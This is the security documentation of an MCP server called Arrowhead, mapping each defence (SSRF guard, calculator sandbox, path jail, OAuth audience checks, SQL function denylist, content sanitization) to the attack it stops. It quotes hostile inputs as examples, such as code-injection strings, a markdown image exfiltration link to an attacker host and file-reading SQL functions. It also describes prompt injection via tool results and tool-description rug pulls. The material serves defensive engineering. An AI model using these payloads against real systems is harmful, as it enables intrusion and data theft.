# Security

This document maps each mitigation in Arrowhead to the vulnerability class it
closes. The three core tools were chosen because they correspond to the three
most common flaws found in real MCP servers; the surrounding layers (auth, rate
limiting, audit logging) close the fourth, missing authentication. Every family
that has been added since &mdash; documents, data connectors, repo
intelligence, assist, exec, context, tasks &mdash; registers behind the same
guard chain, so the same posture covers all of them.

## Server-side request forgery — `safe_fetch`

**Risk.** A fetch tool that accepts an arbitrary URL can be pointed at the
cloud metadata endpoint (`169.254.169.254`), at internal services on private
ranges, or at loopback, exfiltrating credentials or reaching systems the
caller should never touch.

**Mitigation** (`security/ssrf_guard.py`, `tools/safe_fetch.py`):

- The scheme must be `http` or `https`; everything else (`file:`, `gopher:`,
  `dict:`, …) is refused before any network activity.
- The hostname is resolved and every resolved address is checked. If any
  address is not globally routable unicast (private, loopback, link-local,
  carrier-grade NAT, multicast, or the metadata address) the request is
  refused. An IPv4 address embedded in an IPv6 wrapper (IPv4-mapped, 6to4,
  Teredo, NAT64, or IPv4-compatible) is unwrapped and re-checked, so
  `64:ff9b::a9fe:a9fe` cannot reach the metadata endpoint through a NAT64
  gateway. Mixed public-and-private DNS answers are refused as a whole.
- The port must be `80`, `443`, or one a deployment explicitly allow-listed
  (validated at startup); a malformed port is a clean refusal, not an
  unhandled error.
- The approved address is **pinned**: the connection is made to that exact IP
  while the original hostname travels in the `Host` header and as the TLS
  server name. Because the address is never re-resolved between the check and
  the connection, DNS rebinding cannot swap a public record for a private one.
- Redirects are followed manually, and the guard runs again on every hop, so a
  public URL that 302-redirects toward the metadata endpoint is caught.
- Response bodies are capped; the outbound request carries none of the
  caller's MCP credentials.

## Command and code injection — `calculate`

**Risk.** Passing user input to `eval`, `exec`, or a shell lets an attacker run
arbitrary code. This is the single most common MCP server flaw.

**Mitigation** (`security/input_validation.py`, `security/sandbox.py`,
`tools/calculate.py`) — two independent layers:

1. A strict character allowlist accepts only digits, `+ - * / ( ) .`, and
   whitespace. `1+1; import os`, `__import__('os')`, and backtick or `$()`
   shell syntax are all rejected here, before reaching any evaluator.
2. The expression is then parsed to an AST and walked by an interpreter that
   recognizes only numeric literals, the four binary operators, and unary
   plus/minus. Names, calls, attributes, subscripts, and exponentiation are
   refused even though some of them pass the character allowlist — for
   example `2 ** 8` is caught by this second layer. Node count is bounded to
   prevent pathological evaluation cost.

There is no `eval`, no `exec`, and no `subprocess` anywhere in the path.

## Path traversal — `read_file`

**Risk.** A file reader that trusts the requested path can be walked out of its
intended directory with `../../` sequences, absolute paths, or symlinks,
exposing `/etc/passwd`, SSH keys, or application secrets.

**Mitigation** (`security/input_validation.py`, `tools/read_file.py`):

- The path must be relative, contain no `..` components, and carry no null
  bytes; absolute paths are refused up front.
- The path is joined to the configured jail root and fully resolved with
  symlinks followed. The result must still be inside the jail root, so a
  symlink placed inside the jail that points outside it is refused.
- Error messages never echo the requested path, so a probing caller cannot use
  them to map the filesystem.
- Files above a configured size are refused.

## Authentication and authorization

**Risk.** A large share of MCP servers ship with no authentication, and among
those that have it, token mismanagement — accepting tokens minted for other
audiences, or forwarding the caller's token to downstream services — is the
top risk.

**Mitigation** (`auth/oauth.py`, `auth/scopes.py`):

- Arrowhead is an OAuth 2.1 **resource server**. It never issues tokens; an
  external authorization server does. Every HTTP request's bearer token is
  verified for signature, issuer, and expiry.
- **Audience validation is mandatory.** A token whose `aud` does not name this
  server is rejected with 401 even when its signature, issuer, and expiry are
  all valid. Enabling auth without an audience configured is a startup error.
- **No token passthrough.** Outbound `safe_fetch` requests are built from
  scratch and carry no inbound credentials; a regression test asserts the
  absence of any `Authorization` header or cookie.
- Each tool requires a scope; a caller lacking it cannot see the tool in
  `tools/list` and cannot call it. Protected-resource metadata is published at
  `/.well-known/oauth-protected-resource/mcp` per RFC 9728.

### Identity provider

Arrowhead is a resource server, so it needs an external authorization server
to issue tokens. Two provider paths are configurable (`ARROWHEAD_OAUTH_PROVIDER`):

- **`workos`** (recommended for a hosted deployment): WorkOS AuthKit is
  purpose-built for MCP. It supports the Dynamic Client Registration and
  Client-ID-Metadata-Document registration MCP clients use to self-register,
  hosts the authorization server, and serves the discovery metadata. Set
  `ARROWHEAD_OAUTH_AUTHKIT_DOMAIN` to the AuthKit domain and
  `ARROWHEAD_SERVER_PUBLIC_URL` to this server's canonical URL.
- **`jwt`** (bring-your-own-IdP): verify against any OAuth 2.1 issuer via its
  JWKS URI (preferred) or a static public key. Point `ARROWHEAD_OAUTH_ISSUER`,
  `ARROWHEAD_OAUTH_AUDIENCE` (the canonical resource URI), and
  `ARROWHEAD_OAUTH_JWKS_URI` at the IdP. **Keycloak** is a good open-source,
  self-hostable choice here, though its RFC 8707 resource-indicator support is
  still a manual mapper exercise as of early 2026.

The JWKS verification path (key discovery, key rotation, and audience
validation with a JWKS-sourced signature) is covered by an integration test
that serves a key set in-process, so the production path is exercised, not only
a static-key stub.

## Document tools: content, authorization, and mutation

The document suite (`doc_search`, `doc_read`, `doc_retrieve`, `doc_scan`,
`doc_write`) operates over a jailed corpus of JSON, Markdown, and text files
and adds three mitigations beyond the ones above.

**Untrusted content boundary** (`content/`). A tool result flows back into a
model's context, where prose could read as instructions. Every returned
document is sanitized for its format and wrapped in provenance:

- JSON (`content/json_safe.py`) is parsed with size, pre-parse nesting-depth,
  element-count, and duplicate-key bounds, rejects non-standard NaN/Infinity,
  and is re-serialized canonically. Python's parser never instantiates
  arbitrary types, so CWE-502 gadget chains do not apply.
- Markdown (`content/markdown_safe.py`) has raw HTML stripped, image URLs
  dropped (killing zero-click `![](attacker/?secret=…)` exfiltration), links
  restricted to http/https, and `javascript:`/`data:`/`file:` scheme URIs
  neutralized.
- Text (`content/text_safe.py`) has ANSI escapes, control characters, and
  zero-width/bidi characters stripped, a UTF-7 byte-order mark refused, and is
  always decoded as UTF-8 and NFC-normalized.
- Every return is wrapped (`content/provenance.py`) in randomized per-response
  delimiters plus structured metadata and an untrusted-data notice.

**Scope is necessary but not sufficient** (`authz/`). The MCP guidance names
treating the token scope as sufficient an anti-pattern, so each document call
passes a per-resource authorization check after its scope check. Scopes are
split by verb (`docs:search/read/scan/write`); the default policy grants
corpus-wide search/read/scan but confines writes to the caller's own
`<subject>/` namespace, so cross-subject writes are denied. The `Authorizer`
protocol is the seam for an external policy engine (OPA, Cedar). A denial is
audited distinctly (error type `AuthorizationError`) and never echoes the
resource.

**Write-path safety** (`store/document_store.py`, `doc_write`). Writes are
jailed after full path canonicalization (symlink escapes refused), atomic
(temp file, fsync, move into place, so no partial document is ever read), and
no-clobber by default via a race-free hard link. Per-document size and total
corpus quota caps apply. Overwriting is destructive: it requires an explicit
flag and, when the client supports it, human confirmation via elicitation
bound to the token subject; an explicit decline blocks the write.

**Secret and PII redaction** (`security/secret_scan.py`). `doc_scan` reports a
type, a location, and a redacted placeholder `[REDACTED:TYPE:tag]`. The raw
value is never returned or logged; an adversarial test asserts this for each
secret type. The tag is a hash of the value keyed by a random per-process salt,
so the same value redacts to the same tag within one run (letting a caller
correlate occurrences) but cannot be brute-forced back to a low-entropy value
such as an SSN or email, since the salt is secret and never persisted. The
correlation therefore holds within a process, not across restarts. Overlapping
matches for one secret are reported once.

**Search denial-of-service** (`security/search_match.py`). Search is literal by
default. Regex is opt-in and disabled by default, and when enabled runs through
a ReDoS-resistant engine with a hard per-match timeout, applied per line.
Results, files scanned, and aggregate bytes are all bounded.

### A note on scope enforcement

Per the MCP spec, an under-scoped call SHOULD receive a `403` with a
`WWW-Authenticate: insufficient_scope` step-up challenge. Arrowhead instead
hides a tool the caller lacks the scope for (it is filtered from `tools/list`
and reported as unknown on call). This is a deliberate choice: revealing that a
tool exists and which scope it needs leaks the tool surface and scope taxonomy
to an under-privileged caller. The MUST-level discovery path (401 with
`WWW-Authenticate` and `resource_metadata` on a missing or invalid token) is
still served.

## Data connectors: `sql_query`, `vector_search`, `vector_query`, `hybrid_query`, `doc_index`

The SQL connector never runs the caller's raw text. A statement is parsed in the
database's own dialect (derived from the DSN, or set explicitly and validated at
startup), its parenthesis nesting is bounded so a pathological query cannot
exhaust the parser stack, and only a single read-only `SELECT` survives: stacked
statements, every write form, DDL, `SET`, and row-locking clauses (`FOR UPDATE`)
are refused. A denylist of side-effecting, file, network, and administrative
functions (`pg_read_file`, `dblink`, `query_to_xml`, `pg_terminate_backend`,
`LOAD_FILE`, `BENCHMARK`, and the like) is refused as well, since a read query
could otherwise smuggle a table read or a side effect inside a function. Every
referenced table is authorized; a query that reads no table is authorized
against a dedicated tableless resource the default policy does not grant, so a
functions-only query is denied unless a deployment opts in.

The single-statement check, not comment stripping, is what stops a second
statement: the parser preserves comment bodies, so the security property comes
from the statement count. The parser is defense in depth, not a complete
sandbox: the primary controls are a least-privilege read-only database role and
the network egress controls. On Postgres the connector additionally runs each
query in a read-only transaction under a server-side statement timeout; other
engines rely on the parser guard, the function denylist, the in-process
deadline, and the read-only role. Results are bounded by byte count (measured in
bytes, per cell and in total), row count, and column count, and column names,
not just values, are sanitized before they leave the process.

`vector_search` adds tenant isolation as a first-class control: the collection
must be one a deployment allow-listed (the table name is never taken raw from
the caller), and the tenant filter is the authenticated caller, injected
server-side, never an argument, so one tenant cannot read another's rows even
by asking. The query embedding is bound as a parameter, and `k`, row, byte, and
dimension counts are all bounded.

`vector_query` and `hybrid_query` are the text-facing retrieval tools: the
caller's query is embedded server-side through the configured provider, and
authorization runs before embedding, so a denied caller can never trigger an
outbound embedding request. The embedding client posts through the same
SSRF-guarded, redirect-refusing, egress-allowlisted path as `safe_fetch`, with
the endpoint resolved once and pinned. `hybrid_query` fuses the vector ranking
with Postgres full-text rank inside one statement whose only interpolated names
are allow-listed or configured identifiers; the query, language, tenant, and
limits are all bound parameters.

`doc_index` is the ingestion tool and is governed separately on every axis: it
requires the `ingest` action, which the default policy denies; it writes
through `ARROWHEAD_VECTOR_WRITE_DSN`, a credential separate from the read-only
`sql_dsn`, so the read tools cannot write even if a guard failed; and the
tenant it writes under is the authenticated caller returned by authorization,
never an argument. Chunk ids are deterministic hashes of tenant, source, and
index, so a re-index replaces a document's chunks in place and cannot collide
across tenants.

## Repo intelligence: `code_search`, `code_read`, `symbol_map`, `dependency_graph`

The coding tools read a second jail, separate from the document corpus: a
read-only source tree under `ARROWHEAD_REPO_ROOT`. The same traversal rules as
`read_file` apply (relative paths, no parent components, resolved paths must
stay inside the root), and the store adds controls tuned to source trees:
version-control and dependency directories (`.git`, `node_modules`, and the
like) are pruned from every walk so their contents are unreachable, binary
files are refused by content sniff, an extension allowlist bounds what may be
read (enforced identically by `code_read` and `code_explain`), and per-file
and per-walk caps bound every operation. `code_search` filters every candidate
file through the caller's per-file read authorization exactly as `doc_search`
does for documents, and both run the same shared, ReDoS-guarded matcher.
`symbol_map` and `dependency_graph` parse with the stdlib compiler (or the
optional tree-sitter backend), never by executing repository code.

## Resources, prompts, and completions

The non-tool primitives are not a bypass. A resource read runs the same
per-resource authorization and content sanitization as the equivalent tool call,
so `doc://{+path}` is exactly as safe as `doc_read`. Prompts reference documents
by resource URI or by a tool call rather than inlining corpus text, and sanitize
their arguments, so the instruction channel cannot carry untrusted content.
Completion candidates pass the same per-document read authorization as search,
so completion never reveals a path the caller could not read. Because the
low-level completion path bypasses the middleware chain, its handler is wrapped
so a completion passes the same per-caller rate limit, kill switch, and audit
line as a tool call; a rate-limited or disabled completion returns no values
without running the corpus walk. Audit logging, rate limiting, and the kill
switch cover resource reads, prompt gets, and completions, not only tool
calls.

## Asynchronous tasks

Long-running work (a background corpus scan) is exposed as ordinary guarded
tools that pass a server-minted task handle as an argument, following the
2026-07-28 stateless pattern rather than a protocol session. The start tool
authorizes the work and records the caller as the task's owner; `task_get` and
`task_update` resolve the handle only for that owner, so a caller can see or
cancel only its own tasks and a handle it does not own is reported as simply not
found. The task registry is in process, so a task is visible only on the
instance that created it; a multi-instance deployment would back it with the
shared rate-limit store. The wire-level tasks extension is not adopted, because
the stable SDK the server runs on does not speak it (see "MCP specification
and the request path" below).

## Abuse controls and observability

- **Rate limiting** (`security/rate_limit.py`): per-caller, per-tool token
  buckets with cost-appropriate ceilings. Backed by Redis when configured so
  limits hold across replicas. Exceeding a limit is a clean error, not a crash.
- **Kill switch** (`security/kill_switch.py`): any tool, prompt, or resource
  can be taken out of service through configuration without a code change.
  Disabling a resource template (`doc://{+path}`) both hides it from listings
  and refuses every concrete read it expands to.
- **Audit log** (`observability/audit_log.py`): one structured JSON line per
  call on stdout with caller identity, tool, argument *shapes* (never values),
  status, and latency, for the platform's log drain. Redaction happens at the
  source, so secrets in arguments never reach log storage. A resource read is
  logged by its scheme and path shape, never the caller-supplied path itself.
- **Tracing and metrics** (`observability/tracing.py`, `telemetry.py`,
  `metrics.py`): an OpenTelemetry span per call that joins the caller's W3C
  trace context, plus tool-call and duration metrics. Both export over OTLP/HTTP
  when `ARROWHEAD_OTEL_EXPORTER_OTLP_ENDPOINT` is set and are no-ops otherwise,
  so telemetry costs nothing until a collector is configured.

## Transport security

The server does not terminate TLS. In any non-local deployment the hosting
platform or a reverse proxy must provide HTTPS. The HTTP endpoint also enforces
`Host` and `Origin` allowlists (configurable) to defend against DNS rebinding
of the endpoint itself; with neither list set the check stays off, matching the
documented platform-proxy posture where the perimeter rewrites `Host` freely.

Serving HTTP with authentication disabled would expose every tool over the
network with no scope or per-resource check, so the server refuses to start in
that configuration unless a deployment sets `ARROWHEAD_ALLOW_INSECURE_HTTP` for
a deliberate trusted-network test.

## MCP specification and the request path

Arrowhead runs on the official MCP Python SDK, version 2. One streamable-HTTP
endpoint serves both protocol eras: a client sending the reserved `_meta`
envelope reaches the sessionless 2026-07-28 leg, and a client sending the
`initialize` lifecycle reaches the handshake-era leg, negotiated down to the
latest handshake version. Cache hints, argument completion, and elicitation are
all first-class SDK features, so the server carries no low-level API patches.

Because the SDK returns a tool's exception message to the client, the masking
boundary is Arrowhead's own: every tool, resource, and prompt is registered
wrapped in a guard chain (`arrowhead.runtime.guards`) that reproduces the prior
middleware order (tracing span, audit line, kill switch, rate limit, scope
check) and, at its edge, re-raises a deliberate `ToolError` verbatim while
replacing every other exception with a generic refusal. A driver string, a
stack detail, or a database error therefore never reaches a client. Because the
guard lives on the component, an import-and-call invocation runs the identical
path as an HTTP request.

### Authorization and token verification

Bearer tokens are verified in-house (`arrowhead.auth.verifier`) with pyjwt:
signature against the issuer's JWKS or a static key, issuer, expiry, and,
critically, that the token's audience names this server, so a token minted for
another service is refused. The `workos` provider is configuration sugar that
derives the AuthKit issuer and JWKS URI. RFC 9728 protected-resource metadata is
served at `/.well-known/oauth-protected-resource/mcp` and deliberately
advertises no scope list: a caller discovers the scopes it is entitled to
through the filtered tool listing, never through an unauthenticated probe, and a
scoped call it cannot make reports the tool as unknown.

### Trusted internal endpoints for a local model

The completion providers (`code_explain`, `summarize_diff`, `rerank`) post
through the same SSRF-guarded, redirect-refusing path as the embedding client.
A local model server (Ollama, vLLM, LM Studio) sits at a loopback address the
guard refuses by default, so reaching one requires naming its exact `host:port`
pair in `ARROWHEAD_LLM_INTERNAL_HOSTS`. That exemption skips only the
reachability refusals (egress allowlist, port allowlist, non-public address) for
the named pair; the scheme check, the single DNS resolution, and the address
pinning still apply, and only configuration-addressed clients pass it. The
public fetch tools never accept the parameter, so the public SSRF posture is
unchanged.

### Sandboxed execution guarantees, and non-guarantees

The `exec` family (`run_snippet`, `run_tests`) is off by default and, even when
`ARROWHEAD_EXEC_ENABLED` is set, denied by the default authorization policy: a
deployment opts in twice, by the flag and by granting the `execute` action. The
default subprocess runner runs each command in a fresh process group with a
scrubbed environment (no `ARROWHEAD_` configuration, no ambient secrets),
bounds CPU, memory, wall time, output, and process count, executes an explicit
argv rather than a shell, and secret-scans and redacts output before it leaves.
Output beyond the byte cap kills the run immediately, so a flooding child can
neither fill server memory nor hold its wall clock open. `run_tests` executes
only inside a scratch copy of the authorized subtree (bounded by its own file
and byte caps), so a test command can never write into the real repository.
What the subprocess runner does **not** do: it does not block network egress or
filesystem reads beyond ordinary OS permissions. A deployment that needs those
isolated uses the container runner (`ARROWHEAD_EXEC_RUNNER=container`), which
adds `--network none`, a read-only root filesystem, a pids limit, a memory cap,
and the same CPU-time budget enforced as a ulimit inside the container, or an
external sandbox. `RLIMIT_AS` is unreliable on macOS, so memory bounding is
best effort there and dependable on Linux.

### Context packing and working sets

`pack_context` never returns content that bypasses the guards: the pack itself
is authorized at the boundary as a search over the corpus namespace, every
pinned working-set item is re-authorized at pack time (a grant can change after
pinning), every snippet is secret-scanned and redacted before it is packed, and
each is wrapped in per-snippet untrusted framing with a random marker the
content cannot forge. The bundle is capped at the token budget, and an item that
would exceed it is dropped with a truncation flag rather than blowing the
budget.

Working sets are the packer's write surface. `workingset_update` authorizes
every item at pin time under the same per-resource check that would govern
reading it, validates kinds and identifiers, and stores the set keyed by the
caller's verified identity, so another owner's set reads as simply not found.
The registry is bounded twice, per owner and globally, so neither one caller
nor many distinct callers can grow server memory without limit.

### Tool integrity

The `arrowhead://integrity` resource returns a sha256 digest over the semantic
surface of every enabled tool (name, description, input and output schema,
annotations). A client records the digest at consent time and compares it each
session, so a later change to what a tool advertises (a rug pull) is detectable.
The digest legitimately differs between profiles and kill-switch states; a
client pins the digest of the deployment it consented to.
